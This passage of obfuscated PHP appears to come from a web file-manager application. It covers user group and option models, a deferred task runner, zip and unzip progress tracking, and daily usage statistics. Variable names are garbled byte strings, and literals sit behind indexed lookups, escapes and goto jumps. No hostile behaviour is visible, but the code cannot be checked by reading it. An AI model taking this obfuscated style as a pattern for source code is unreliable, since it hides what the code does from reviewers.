$this->_listAppendMeta($æÏò‚‘’, $üÌê‰íÊ); $this->_listAppendSourceRoot($æÏò‚‘’, $üÌê‰íÊ); } private function _listAppendSourceRoot(&$ÙÓ€Ë±Ø, $Œâöœş) { $œ×ÚµÜ =& $_SERVER[´È¥ö†ö]; $Ê®Ì’ù = Model($œ×ÚµÜ[901])->listSourceRoot(SourceModel::TYPE_USER, $Œâöœş); $Ê®Ì’ù = array_to_keyvalue($Ê®Ì’ù, $œ×ÚµÜ[580]); $Ê®Ì’ù = array_remove_key($Ê®Ì’ù, $œ×ÚµÜ[580]); foreach ($ÙÓ€Ë±Ø as &$Ö‰Æ— Ú) { $Ö‰Æ— Ú[$œ×ÚµÜ[90]] = $Ê®Ì’ù[$Ö‰Æ— Ú[$œ×ÚµÜ[1773]]] ? $Ê®Ì’ù[$Ö‰Æ— Ú[$œ×ÚµÜ[1773]]] : array(); } unset($Ö‰Æ— Ú); } private function _listAppendGroup(&$¯¬àø£ä, $‘æÚÂ«˜) { $ş©è×Ÿ© =& $_SERVER[´È¥ö†ö]; $š½ÔŞ»Í = array($ş©è×Ÿ©[1773] => array($ş©è×Ÿ©[7], $‘æÚÂ«˜)); $Ï‡Ä‡ = Model($ş©è×Ÿ©[2068])->where($š½ÔŞ»Í)->select(); $Ú®Ì£€ = array_to_keyvalue($Ï‡Ä‡, $ş©è×Ÿ©[12], $ş©è×Ÿ©[1974]); $Ú®Ì£€ = array_remove_value(array_unique($Ú®Ì£€), $ş©è×Ÿ©[230]); if (!$Ú®Ì£€ || !$Ï‡Ä‡) { return; } $š½ÔŞ»Í = array($ş©è×Ÿ©[1974] => array($ş©è×Ÿ©[7], $Ú®Ì£€)); $©¾ÂØœù = Model($ş©è×Ÿ©[2164])->field($ş©è×Ÿ©[2505])->where($š½ÔŞ»Í)->select(); $©¾ÂØœù = array_to_keyvalue($©¾ÂØœù, $ş©è×Ÿ©[1974]); $Ï‡Ä‡ = array_to_keyvalue_group($Ï‡Ä‡, $ş©è×Ÿ©[1773]); foreach ($Ï‡Ä‡ as &$¢õ£î §) { $äÀ²ÁÍÍ = array(); foreach ($¢õ£î § as $Í†ØÚ¢Ä) { if (!$Í†ØÚ¢Ä[$ş©è×Ÿ©[2082]]) { continue; } $ó¦¦ö€æ = Model($ş©è×Ÿ©[582])->listData($Í†ØÚ¢Ä[$ş©è×Ÿ©[2082]]); $äÀ²ÁÍÍ[] = array($ş©è×Ÿ©[1974] => $Í†ØÚ¢Ä[$ş©è×Ÿ©[1974]], $ş©è×Ÿ©[2506] => $©¾ÂØœù[$Í†ØÚ¢Ä[$ş©è×Ÿ©[1974]]][$ş©è×Ÿ©[32]], $ş©è×Ÿ©[595] => $©¾ÂØœù[$Í†ØÚ¢Ä[$ş©è×Ÿ©[1974]]][$ş©è×Ÿ©[595]], $ş©è×Ÿ©[498] => $ó¦¦ö€æ); } $¢õ£î § = $äÀ²ÁÍÍ; } unset($¢õ£î §); foreach ($¯¬àø£ä as &$ç¸Î®ê¼) { $ç¸Î®ê¼[$ş©è×Ÿ©[2166]] = array(); if (isset($Ï‡Ä‡[$ç¸Î®ê¼[$ş©è×Ÿ©[1773]]])) { $ç¸Î®ê¼[$ş©è×Ÿ©[2166]] = $Ï‡Ä‡[$ç¸Î®ê¼[$ş©è×Ÿ©[1773]]]; } } unset($ç¸Î®ê¼); } public function userAppendGroup($€¬­˜Éİ) { $¿„–îŒü =& $_SERVER[´È¥ö†ö]; if (!$€¬­˜Éİ) { return array(); } $this->_listAppendGroup($€¬­˜Éİ, array_to_keyvalue($€¬­˜Éİ, $¿„–îŒü[12], $¿„–îŒü[1773])); return $€¬­˜Éİ; } private function _listAppendMeta(&$¹Û†•‘ö, $Ğ¬æäê—) { $ú³õÏ“ =& $_SERVER[´È¥ö†ö]; $ÙÅ¾Ó”· = UserJobModel::JOB_KEY; $¸Àø©ã = array($ú³õÏ“[2486]); $á¢¦¿Ê = array($ú³õÏ“[1773] => array($ú³õÏ“[7], $Ğ¬æäê—)); $ï’½‘ö = Model($ú³õÏ“[2484])->where($á¢¦¿Ê)->select(); $ï’½‘ö = array_to_keyvalue_group($ï’½‘ö, $ú³õÏ“[1773]); foreach ($ï’½‘ö as &$—¤ïŒµş) { $§æƒ‹ó = array(); foreach ($—¤ïŒµş as $Ê¼áåİğ) { if (!in_array($Ê¼áåİğ[$ú³õÏ“[97]], $¸Àø©ã)) { $§æƒ‹ó[$Ê¼áåİğ[$ú³õÏ“[97]]] = $Ê¼áåİğ[$ú³õÏ“[461]]; } } $—¤ïŒµş = $§æƒ‹ó; } unset($—¤ïŒµş); $„¿‘™ı¦ = Model($ú³õÏ“[2507]); foreach ($¹Û†•‘ö as &$éÏÑÔğ) { $õ¯Ù¾Ì˜ = array(); if (isset($ï’½‘ö[$éÏÑÔğ[$ú³õÏ“[1773]]])) { $õ¯Ù¾Ì˜ = $ï’½‘ö[$éÏÑÔğ[$ú³õÏ“[1773]]]; } $éÏÑÔğ[$ú³õÏ“[2508]] = array(); if (isset($õ¯Ù¾Ì˜[$ÙÅ¾Ó”·])) { $éÏÑÔğ[$ú³õÏ“[2508]] = $„¿‘™ı¦->getUserJobInfo($õ¯Ù¾Ì˜[$ÙÅ¾Ó”·]); } } unset($éÏÑÔğ); } protected function groupUserAll($®•÷ŞÑ‡) { $êß‘â± =& $_SERVER[´È¥ö†ö]; if (!$®•÷ŞÑ‡) { return !1; } $šÎş’¸€ = Model($êß‘â±[2068])->field($êß‘â±[1773])->where(array($êß‘â±[1974] => array($êß‘â±[7], $®•÷ŞÑ‡)))->select(); $šÎş’¸€ = array_to_keyvalue($šÎş’¸€, $êß‘â±[12], $êß‘â±[1773]); return array_unique($šÎş’¸€); } public function userSearch($ïÁ„ÑÂÊ, $—ôÃÕ‰• = "\52") { return Model($_SERVER[´È¥ö†ö][608])->where($ïÁ„ÑÂÊ)->field($—ôÃÕ‰•)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\137\157\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ùİ¸Ò‘Ì) { $ÜïåŒî =& $_SERVER[´È¥ö†ö]; $…õ©Æı¢ = defined($ÜïåŒî[2201]) && USER_ID ? USER_ID : $ÜïåŒî[12]; return "\125\x73\x65\x72\x4f\160\x74\x69\157\x6e\x5f{$Ùİ¸Ò‘Ì}\x5f" . $…õ©Æı¢; } protected function filterWhere($‘Ä½ÌÈã) { $ÇâÉÀë• =& $_SERVER[´È¥ö†ö]; $‘Ä½ÌÈã[$ÇâÉÀë•[1773]] = defined($ÇâÉÀë•[2201]) && USER_ID ? USER_ID : $ÇâÉÀë•[12]; return $‘Ä½ÌÈã; } public function cacheRemoveUser($¸‚Öù, $’»ì¦¥Ô) { return Cache::remove("\125\163\145\x72\117\160\164\x69\x6f\x6e\x5f{$¸‚Öù}\137" . $’»ì¦¥Ô); } protected function optionDefault($ô…›Ù— = '') { $ó÷—í’Ì =& $_SERVER[´È¥ö†ö]; if ($ô…›Ù— == $ó÷—í’Ì[12]) { return $GLOBALS[$ó÷—í’Ì[6]][$ó÷—í’Ì[2509]]; } if ($ô…›Ù— == $ó÷—í’Ì[2510]) { return $GLOBALS[$ó÷—í’Ì[6]][$ó÷—í’Ì[2511]]; } } } goto cÔÓ¬ÔÆ; dš·“õš‹: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($º›òÁ¤ğ, $æÁ½¥³æ = 5.0) { if (!$º›òÁ¤ğ) { return; } $’ˆ‡ŒÇì = Cache::get($º›òÁ¤ğ); if (!$’ˆ‡ŒÇì || timeFloat() - floatVal($’ˆ‡ŒÇì) >= $æÁ½¥³æ) { Cache::set($º›òÁ¤ğ, timeFloat(), $æÁ½¥³æ * 10); return !0; } return !1; } public static function timeLimitCall($úÏ¨ïÑî, $ÌÏá¸Ğñ, $™äÓó·¥, $°•§¿¦Ú = 5.0) { $üˆ‘ÎÉç =& $_SERVER[´È¥ö†ö]; if (!$úÏ¨ïÑî || !$ÌÏá¸Ğñ) { return; } self::$asyncAdd = !0; $Ü¶À•Ÿ = $üˆ‘ÎÉç[1881]; $¬•ƒÆÚÂ = Cache::get($Ü¶À•Ÿ, !0); $´‘«ÃÑĞ = array($üˆ‘ÎÉç[1882] => timeFloat(), $üˆ‘ÎÉç[1883] => timeFloat(), $üˆ‘ÎÉç[352] => $ÌÏá¸Ğñ, $üˆ‘ÎÉç[1873] => $™äÓó·¥, $üˆ‘ÎÉç[206] => $°•§¿¦Ú); if (is_array($¬•ƒÆÚÂ[$úÏ¨ïÑî])) { $´‘«ÃÑĞ[$üˆ‘ÎÉç[1883]] = $¬•ƒÆÚÂ[$úÏ¨ïÑî][$üˆ‘ÎÉç[1883]]; } if (is_array($¬•ƒÆÚÂ[$úÏ¨ïÑî])) { if (timeFloat() - $¬•ƒÆÚÂ[$úÏ¨ïÑî][$üˆ‘ÎÉç[1882]] < $´‘«ÃÑĞ[$üˆ‘ÎÉç[206]] * 0.3) { return; } $´‘«ÃÑĞ[$üˆ‘ÎÉç[1883]] = $¬•ƒÆÚÂ[$úÏ¨ïÑî][$üˆ‘ÎÉç[1883]]; } $¬•ƒÆÚÂ[$úÏ¨ïÑî] = $´‘«ÃÑĞ; Cache::set($Ü¶À•Ÿ, $¬•ƒÆÚÂ, 60); Cache::removeMemory($Ü¶À•Ÿ); write_log($üˆ‘ÎÉç[1884] . $úÏ¨ïÑî . $üˆ‘ÎÉç[74] . $ÌÏá¸Ğñ, $üˆ‘ÎÉç[197]); } public static function timeLimitCallLoop() { $ÄäƒÆÕ =& $_SERVER[´È¥ö†ö]; $÷â©Å‘Ã = array($ÄäƒÆÕ[1885]); $è÷½æ¾’ = in_array(strtolower(ACTION), $÷â©Å‘Ã); if (!$è÷½æ¾’ && !self::$asyncAdd) { return; } $·˜ µùø = $ÄäƒÆÕ[1881]; $ì¾ÛØı = Cache::get($·˜ µùø, !0); if (!$ì¾ÛØı || count($ì¾ÛØı) <= 0) { return; } $ªÓÌ² = !1; $ Ä†üÏ¼ = timeFloat(); $ı‡Å™šé = array(); foreach ($ì¾ÛØı as $‘™×úñ => $Ã›öš²) { if ($ Ä†üÏ¼ - $Ã›öš²[$ÄäƒÆÕ[1883]] > $Ã›öš²[$ÄäƒÆÕ[206]]) { $ªÓÌ² = !0; try { Hook::apply($Ã›öš²[$ÄäƒÆÕ[352]], $Ã›öš²[$ÄäƒÆÕ[1873]]); write_log($ÄäƒÆÕ[1886] . $‘™×úñ . $ÄäƒÆÕ[74] . $Ã›öš²[$ÄäƒÆÕ[352]] . $ÄäƒÆÕ[1887] . ACTION, $ÄäƒÆÕ[197]); } catch (Exception $ÛµëÍÙ„) { } continue; } $ı‡Å™šé[$‘™×úñ] = $Ã›öš²; } if (!$ªÓÌ²) { return; } if (!$ı‡Å™šé) { return Cache::remove($·˜ µùø); } Cache::set($·˜ µùø, $ı‡Å™šé, 60); Cache::removeMemory($·˜ µùø); } public static function finished($âŠòÉä˜, $´üëÄ²Ú) { $‰ÕÜöƒ =& $_SERVER[´È¥ö†ö]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($‰ÕÜöƒ[352] => $âŠòÉä˜, $‰ÕÜöƒ[1873] => $´üëÄ²Ú); } private static function finishedRun() { $„êû ûÉ =& $_SERVER[´È¥ö†ö]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $üÑ—Áê) { try { Hook::apply($üÑ—Áê[$„êû ûÉ[352]], $üÑ—Áê[$„êû ûÉ[1873]]); } catch (Exception $ÄÜ¾öå³) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Õ¼ÍŞÂ =& $_SERVER[´È¥ö†ö]; parent::startAfter(); Hook::bind($Õ¼ÍŞÂ[1888], array($this, $Õ¼ÍŞÂ[1889])); Hook::bind($Õ¼ÍŞÂ[1277], array($this, $Õ¼ÍŞÂ[1890])); Hook::bind($Õ¼ÍŞÂ[1891], array($this, $Õ¼ÍŞÂ[1892])); $Ûşü·Œ¼ =& $this->task; $Ûşü·Œ¼[$Õ¼ÍŞÂ[1893]] = $Õ¼ÍŞÂ[1278]; if (!$Ûşü·Œ¼[$Õ¼ÍŞÂ[1659]]) { $Ûşü·Œ¼[$Õ¼ÍŞÂ[1659]] = LNG($Õ¼ÍŞÂ[1894]); } } protected function endAfter() { $æ’ïáãû =& $_SERVER[´È¥ö†ö]; parent::endAfter(); Hook::unbind($æ’ïáãû[1888], array($this, $æ’ïáãû[1889])); Hook::unbind($æ’ïáãû[1277], array($this, $æ’ïáãû[1890])); Hook::unbind($æ’ïáãû[1891], array($this, $æ’ïáãû[1892])); } public function updateAfter() { $È–ğá¹ =& $_SERVER[´È¥ö†ö]; $•°³°¢  =& $this->task; if (!$•°³°¢ [$È–ğá¹[1139]] || !$•°³°¢ [$È–ğá¹[839]]) { if ($•°³°¢ [$È–ğá¹[1893]] != $È–ğá¹[399]) { return; } } if ($•°³°¢ [$È–ğá¹[1893]] == $È–ğá¹[1278]) { $¤Ó‚¢Ÿ‘ = 0; if ($•°³°¢ [$È–ğá¹[1827]]) { $¤Ó‚¢Ÿ‘ = $•°³°¢ [$È–ğá¹[1828]] / $•°³°¢ [$È–ğá¹[1827]]; } $•°³°¢ [$È–ğá¹[1775]] = $¤Ó‚¢Ÿ‘ * 0.3; } else { if ($•°³°¢ [$È–ğá¹[1893]] == $È–ğá¹[399]) { $¤Ó‚¢Ÿ‘ = $•°³°¢ [$È–ğá¹[1774]] / $•°³°¢ [$È–ğá¹[1139]]; $•°³°¢ [$È–ğá¹[1775]] = 0.3 + $¤Ó‚¢Ÿ‘ * 0.4; } else { if ($•°³°¢ [$È–ğá¹[1893]] == $È–ğá¹[110]) { $Šöòˆá€ = 0; if ($•°³°¢ [$È–ğá¹[1829]] == $È–ğá¹[110]) { $Šöòˆá€ = $•°³°¢ [$È–ğá¹[1828]]; } $¤Ó‚¢Ÿ‘ = ($•°³°¢ [$È–ğá¹[1832]] + $Šöòˆá€) / $•°³°¢ [$È–ğá¹[839]]; $•°³°¢ [$È–ğá¹[1775]] = 0.3 + 0.4 + $¤Ó‚¢Ÿ‘ * 0.3; } } } if ($•°³°¢ [$È–ğá¹[1775]] > 0) { $èò®è³‚ = timeFloat() - $•°³°¢ [$È–ğá¹[1777]] - $•°³°¢ [$È–ğá¹[1780]]; $•°³°¢ [$È–ğá¹[1781]] = $èò®è³‚ * (1 - $•°³°¢ [$È–ğá¹[1775]]) / $•°³°¢ [$È–ğá¹[1775]]; } } public function addFile($èŒÚºã«) { $åÊŠÎŸË =& $_SERVER[´È¥ö†ö]; $¢çè·›Ş =& $this->task; $ª±™¯£ = IO::info($èŒÚºã«); $¢çè·›Ş[$åÊŠÎŸË[1825]] = $ª±™¯£[$åÊŠÎŸË[32]]; $¢çè·›Ş[$åÊŠÎŸË[1827]] = $ª±™¯£[$åÊŠÎŸË[79]]; $¢çè·›Ş[$åÊŠÎŸË[1828]] = 0; $¢çè·›Ş[$åÊŠÎŸË[1141]] = $åÊŠÎŸË[1848]; $¢çè·›Ş[$åÊŠÎŸË[1829]] = $åÊŠÎŸË[1278]; $¢çè·›Ş[$åÊŠÎŸË[839]] = $ª±™¯£[$åÊŠÎŸË[79]]; $¢çè·›Ş[$åÊŠÎŸË[1139]] = 1; $Ê¶ˆÛö­ = 0; $¢çè·›Ş[$åÊŠÎŸË[1836]] = array($åÊŠÎŸË[1837] => $Ê¶ˆÛö­ + 1, $åÊŠÎŸË[505] => $ª±™¯£[$åÊŠÎŸË[32]], $åÊŠÎŸË[87] => $ª±™¯£[$åÊŠÎŸË[87]], $åÊŠÎŸË[593] => $ª±™¯£[$åÊŠÎŸË[593]] ? $ª±™¯£[$åÊŠÎŸË[593]] : $ª±™¯£[$åÊŠÎŸË[87]]); $this->update(); } public function zipEvent($ÔÆòÒ×¸, $®”á, $ˆÏôä‹, $šá¸‘ã¡) { $ßñ•úâ =& $_SERVER[´È¥ö†ö]; $ÅØ–«Ùé =& $this->task; $ÅØ–«Ùé[$ßñ•úâ[1825]] = get_path_this($®”á); $ÅØ–«Ùé[$ßñ•úâ[1827]] = $šá¸‘ã¡; $ÅØ–«Ùé[$ßñ•úâ[1828]] = $ˆÏôä‹; $ÅØ–«Ùé[$ßñ•úâ[1141]] = $ÔÆòÒ×¸ == $ßñ•úâ[1895] ? $ßñ•úâ[1896] : $ßñ•úâ[1897]; $ÅØ–«Ùé[$ßñ•úâ[1829]] = $ßñ•úâ[12]; $ÅØ–«Ùé[$ßñ•úâ[839]] = $šá¸‘ã¡; $ÅØ–«Ùé[$ßñ•úâ[1893]] = $ßñ•úâ[399]; $this->update(); } public function unzipAfter($•¦ö¥¨Æ) { $‘ªó²÷— =& $_SERVER[´È¥ö†ö]; $ı‘¨¡•† =& $this->task; $ı‘¨¡•†[$‘ªó²÷—[1893]] = $‘ªó²÷—[110]; $¡—¸ƒ²¹ = IO::infoWithChildren($•¦ö¥¨Æ); $Á ºÚ¥± = 0; $ı‘¨¡•†[$‘ªó²÷—[1836]] = array($‘ªó²÷—[1837] => $Á ºÚ¥± + 1, $‘ªó²÷—[505] => $¡—¸ƒ²¹[$‘ªó²÷—[32]], $‘ªó²÷—[87] => $¡—¸ƒ²¹[$‘ªó²÷—[87]], $‘ªó²÷—[593] => $¡—¸ƒ²¹[$‘ªó²÷—[593]] ? $¡—¸ƒ²¹[$‘ªó²÷—[593]] : $¡—¸ƒ²¹[$‘ªó²÷—[87]]); if ($¡—¸ƒ²¹[$‘ªó²÷—[33]] == $‘ªó²÷—[232]) { $ı‘¨¡•†[$‘ªó²÷—[1139]] = 1; } else { $ı‘¨¡•†[$‘ªó²÷—[1139]] = $¡—¸ƒ²¹[$‘ªó²÷—[82]][$‘ªó²÷—[80]]; } $ı‘¨¡•†[$‘ªó²÷—[1141]] = $‘ªó²÷—[12]; $ı‘¨¡•†[$‘ªó²÷—[1829]] = 0; $ı‘¨¡•†[$‘ªó²÷—[1774]] = 0; $ı‘¨¡•†[$‘ªó²÷—[1827]] = 0; $ı‘¨¡•†[$‘ªó²÷—[1828]] = 0; $ı‘¨¡•†[$‘ªó²÷—[1825]] = $‘ªó²÷—[12]; $ı‘¨¡•†[$‘ªó²÷—[1832]] = 0; $ı‘¨¡•†[$‘ªó²÷—[839]] = $¡—¸ƒ²¹[$‘ªó²÷—[79]]; $this->update(); self::log($‘ªó²÷—[1898] . json_encode(array($ı‘¨¡•†, $¡—¸ƒ²¹))); } public function nameParse($å¡€ããÖ) { $ŠÚŞ®‡¡ =& $_SERVER[´È¥ö†ö]; $ŸÚù­ÍÖ =& $this->task; if ($ŸÚù­ÍÖ[$ŠÚŞ®‡¡[1893]] == $ŠÚŞ®‡¡[1278]) { $ŸÚù­ÍÖ[$ŠÚŞ®‡¡[1893]] = $ŠÚŞ®‡¡[399]; $ŸÚù­ÍÖ[$ŠÚŞ®‡¡[1832]] = 0; $ŸÚù­ÍÖ[$ŠÚŞ®‡¡[839]] = 0; } $¤óç†™’ = get_path_this($å¡€ããÖ); if (strstr($¤óç†™’, $ŠÚŞ®‡¡[10])) { $ŸÚù­ÍÖ[$ŠÚŞ®‡¡[1774]] += 1; $ŸÚù­ÍÖ[$ŠÚŞ®‡¡[1139]] += 1; } $ŸÚù­ÍÖ[$ŠÚŞ®‡¡[1825]] = $å¡€ããÖ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ş˜€Üùà =& $_SERVER[´È¥ö†ö]; parent::startAfter(); Hook::bind($Ş˜€Üùà[1899], array($this, $Ş˜€Üùà[1889])); Hook::bind($Ş˜€Üùà[1891], array($this, $Ş˜€Üùà[1892])); $¡“×§• =& $this->task; $¡“×§•[$Ş˜€Üùà[1893]] = $Ş˜€Üùà[1278]; if (!$¡“×§•[$Ş˜€Üùà[1659]]) { $¡“×§•[$Ş˜€Üùà[1659]] = LNG($Ş˜€Üùà[1900]); } } protected function endAfter() { $³¿÷é°Ã =& $_SERVER[´È¥ö†ö]; parent::endAfter(); Hook::unbind($³¿÷é°Ã[1899], array($this, $³¿÷é°Ã[1889])); Hook::unbind($³¿÷é°Ã[1891], array($this, $³¿÷é°Ã[1892])); } public function updateAfter() { $ƒëôÓĞ =& $_SERVER[´È¥ö†ö]; $ªßÒ¾Êµ =& $this->task; if (!$ªßÒ¾Êµ[$ƒëôÓĞ[1139]] || !$ªßÒ¾Êµ[$ƒëôÓĞ[839]]) { return; } if ($ªßÒ¾Êµ[$ƒëôÓĞ[1893]] == $ƒëôÓĞ[1278]) { $Âôë°¾ = $ªßÒ¾Êµ[$ƒëôÓĞ[1828]]; if ($ªßÒ¾Êµ[$ƒëôÓĞ[1829]] != $ƒëôÓĞ[1278]) { $Âôë°¾ = 0; } $¸‚çæé = ($ªßÒ¾Êµ[$ƒëôÓĞ[1832]] + $Âôë°¾) / $ªßÒ¾Êµ[$ƒëôÓĞ[839]]; $ªßÒ¾Êµ[$ƒëôÓĞ[1775]] = $¸‚çæé * 0.3; } else { if ($ªßÒ¾Êµ[$ƒëôÓĞ[1893]] == $ƒëôÓĞ[399]) { $¸‚çæé = $ªßÒ¾Êµ[$ƒëôÓĞ[1774]] / $ªßÒ¾Êµ[$ƒëôÓĞ[1139]]; $ªßÒ¾Êµ[$ƒëôÓĞ[1775]] = 0.3 + $¸‚çæé * 0.5; } else { if ($ªßÒ¾Êµ[$ƒëôÓĞ[1893]] == $ƒëôÓĞ[110]) { $¸‚çæé = 0; if ($ªßÒ¾Êµ[$ƒëôÓĞ[1827]]) { $¸‚çæé = $ªßÒ¾Êµ[$ƒëôÓĞ[1828]] / $ªßÒ¾Êµ[$ƒëôÓĞ[1827]]; } $ªßÒ¾Êµ[$ƒëôÓĞ[1775]] = 0.3 + 0.5 + $¸‚çæé * 0.2; } } } if ($ªßÒ¾Êµ[$ƒëôÓĞ[1775]] > 0) { $¹Ú±üœ¢ = timeFloat() - $ªßÒ¾Êµ[$ƒëôÓĞ[1777]] - $ªßÒ¾Êµ[$ƒëôÓĞ[1780]]; $ªßÒ¾Êµ[$ƒëôÓĞ[1781]] = $¹Ú±üœ¢ * (1 - $ªßÒ¾Êµ[$ƒëôÓĞ[1775]]) / $ªßÒ¾Êµ[$ƒëôÓĞ[1775]]; } } public function copyFileStart($…şõ“Õ×, $ŸüÙœ¬Œ, $Üç”´Æ, $‚¿âúğ, $¬›úˆó…, $€öÔò‚) { $«ûåÇ˜È =& $_SERVER[´È¥ö†ö]; parent::copyFileStart($…şõ“Õ×, $ŸüÙœ¬Œ, $Üç”´Æ, $‚¿âúğ, $¬›úˆó…, $€öÔò‚); $¢µ§‚íÁ =& $this->task; if ($¢µ§‚íÁ[$«ûåÇ˜È[1893]] == $«ûåÇ˜È[399]) { $¢µ§‚íÁ[$«ûåÇ˜È[1893]] = $«ûåÇ˜È[110]; } $this->update(); } public function copyFileEnd($Æ·ı’½, $•Ü˜şö§, $­ò¥¨³, $›ÄÉ’ÑŞ, $©ÕÎ³öœ, $ÔİÛÔˆË) { $¡®¶’à =& $_SERVER[´È¥ö†ö]; $”úÛ…¸¾ =& $this->task; $”úÛ…¸¾[$¡®¶’à[1828]] = $”úÛ…¸¾[$¡®¶’à[1827]]; $”úÛ…¸¾[$¡®¶’à[1832]] += $”úÛ…¸¾[$¡®¶’à[1827]]; $”úÛ…¸¾[$¡®¶’à[1829]] = $¡®¶’à[12]; $this->update(); } public function zipEvent($‹éª£Îº, $ª‡ Ñï‘, $æòÌ¡´ª, $áé¨áÛ) { $äñá‘¶ï =& $_SERVER[´È¥ö†ö]; $È¡Á Äµ =& $this->task; $È¡Á Äµ[$äñá‘¶ï[1825]] = get_path_this($ª‡ Ñï‘); $È¡Á Äµ[$äñá‘¶ï[1827]] = $áé¨áÛ; $È¡Á Äµ[$äñá‘¶ï[1828]] = $æòÌ¡´ª; $È¡Á Äµ[$äñá‘¶ï[1141]] = $‹éª£Îº == $äñá‘¶ï[1901] ? $äñá‘¶ï[1896] : $äñá‘¶ï[1897]; $È¡Á Äµ[$äñá‘¶ï[1829]] = $äñá‘¶ï[12]; $È¡Á Äµ[$äñá‘¶ï[839]] = $áé¨áÛ; $È¡Á Äµ[$äñá‘¶ï[1893]] = $äñá‘¶ï[399]; $this->update(); } public function nameParse($Âõ§²«À) { $»ûíüû¯ =& $_SERVER[´È¥ö†ö]; $”ûŸÀ¤÷ =& $this->task; if ($”ûŸÀ¤÷[$»ûíüû¯[1774]] < $”ûŸÀ¤÷[$»ûíüû¯[1139]]) { $ƒÌ…ˆÓĞ = get_path_this($Âõ§²«À); if (strstr($ƒÌ…ˆÓĞ, $»ûíüû¯[10])) { $”ûŸÀ¤÷[$»ûíüû¯[1774]] += 1; } } if ($”ûŸÀ¤÷[$»ûíüû¯[1893]] == $»ûíüû¯[1278]) { $”ûŸÀ¤÷[$»ûíüû¯[1893]] = $»ûíüû¯[399]; } $”ûŸÀ¤÷[$»ûíüû¯[1825]] = $Âõ§²«À; $this->update(); } } goto c‚‚Ä·Óˆ; c‚‚Ä·Óˆ: class AnalysisModel extends ModelBaseLight { public function init($ğ´õæÔä) { $±ÇÈ­‡Î =& $_SERVER[´È¥ö†ö]; $øÕ¨ÉÁ§ = array($±ÇÈ­‡Î[676] => array($±ÇÈ­‡Î[33] => $±ÇÈ­‡Î[1902], $±ÇÈ­‡Î[361] => array($±ÇÈ­‡Î[284], $±ÇÈ­‡Î[841], $±ÇÈ­‡Î[1903], $±ÇÈ­‡Î[1904])), $±ÇÈ­‡Î[1905] => array($±ÇÈ­‡Î[33] => $±ÇÈ­‡Î[1906], $±ÇÈ­‡Î[361] => array($±ÇÈ­‡Î[284], $±ÇÈ­‡Î[839], $±ÇÈ­‡Î[1907], $±ÇÈ­‡Î[1908], $±ÇÈ­‡Î[1909]))); if (!isset($øÕ¨ÉÁ§[$ğ´õæÔä])) { return !1; } $this->optionType = $øÕ¨ÉÁ§[$ğ´õæÔä][$±ÇÈ­‡Î[33]]; $this->field = $øÕ¨ÉÁ§[$ğ´õæÔä][$±ÇÈ­‡Î[361]]; return !0; } public function listData($ÖãåÄ ì = false, $¦ùøêëç = "\155\157\x64\151\146\x79\x54\x69\x6d\145", $¸µÔáŞÄ = false) { return parent::listData($ÖãåÄ ì, $¦ùøêëç, $¸µÔáŞÄ); } public function trendList($€õ•Êïê) { $­›ß³Ğê =& $_SERVER[´È¥ö†ö]; $÷×äúŠÊ = $this->listData(); if ($÷×äúŠÊ) { $á¿»½³› = end($÷×äúŠÊ); $ŞÕ¤¿»Ï = date($­›ß³Ğê[1910], strtotime($­›ß³Ğê[1911])); if ($á¿»½³›[$­›ß³Ğê[284]] == $ŞÕ¤¿»Ï) { return $÷×äúŠÊ; } $ø“ó°ç² = strtotime($á¿»½³›[$­›ß³Ğê[284]]); } if (!isset($ø“ó°ç²)) { $°§•ÁÅ = $€õ•Êïê == $­›ß³Ğê[676] ? $­›ß³Ğê[608] : $­›ß³Ğê[901]; $ø“ó°ç² = Model($°§•ÁÅ)->min($­›ß³Ğê[233]); } $²«‰ä¨İ = $­›ß³Ğê[1912] . ucfirst($€õ•Êïê); $ÆşØ¤— = $this->dateList($ø“ó°ç²); foreach ($ÆşØ¤— as $ŞÕ¤¿»Ï) { $this->{$²«‰ä¨İ}($ŞÕ¤¿»Ï); } return $this->listData(); } private function dateList($ÙÀËÉş) { $Ô‹ÔÚÔº =& $_SERVER[´È¥ö†ö]; $³…–‡’¤ = $ÙÀËÉş; $¦¢ä’”¯ = strtotime($Ô‹ÔÚÔº[1911]); $œŸã‹Æ‹ = array(); while ($³…–‡’¤ <= $¦¢ä’”¯) { $œŸã‹Æ‹[] = date($Ô‹ÔÚÔº[1910], $³…–‡’¤); $³…–‡’¤ = strtotime($Ô‹ÔÚÔº[1913], $³…–‡’¤); } return $œŸã‹Æ‹; } public function _recordUser($¤ÎÒ¯Ü¶ = '') { $ëÏ÷’Û =& $_SERVER[´È¥ö†ö]; $¹ÁÄàØÈ = strtotime(date($ëÏ÷’Û[1914], strtotime($¤ÎÒ¯Ü¶))); $ƒ©Äù§‰ = strtotime(date($ëÏ÷’Û[1915], strtotime($¤ÎÒ¯Ü¶))); $èæÒÁºû = array($ëÏ÷’Û[233] => array($ëÏ÷’Û[1089], $ƒ©Äù§‰)); $çìù÷ƒ‘ = Model($ëÏ÷’Û[608])->where($èæÒÁºû)->count($ëÏ÷’Û[1773]); $èæÒÁºû[$ëÏ÷’Û[233]] = array($ëÏ÷’Û[419], array($¹ÁÄàØÈ, $ƒ©Äù§‰)); $Å»´Ö„Ó = Model($ëÏ÷’Û[608])->where($èæÒÁºû)->count($ëÏ÷’Û[1773]); $èæÒÁºû[$ëÏ÷’Û[33]] = $ëÏ÷’Û[1916]; $Œı±˜Àº = Model($ëÏ÷’Û[1917])->where($èæÒÁºû)->count($ëÏ÷’Û[1918]); $‹÷ÏÖ±» = array($ëÏ÷’Û[284] => $¤ÎÒ¯Ü¶, $ëÏ÷’Û[841] => (int) $çìù÷ƒ‘, $ëÏ÷’Û[1903] => (int) $Å»´Ö„Ó, $ëÏ÷’Û[1904] => (int) $Œı±˜Àº); return $this->insert($‹÷ÏÖ±»); } public function _recordStore($Ã¦°æİ¨ = '') { $õÛœÂ®÷ =& $_SERVER[´È¥ö†ö]; $µºÀÒ¬ = strtotime(date($õÛœÂ®÷[1915], strtotime($Ã¦°æİ¨))); $íêóøí² = array($õÛœÂ®÷[233] => array($õÛœÂ®÷[1089], $µºÀÒ¬)); $’Ñ¬‹• = 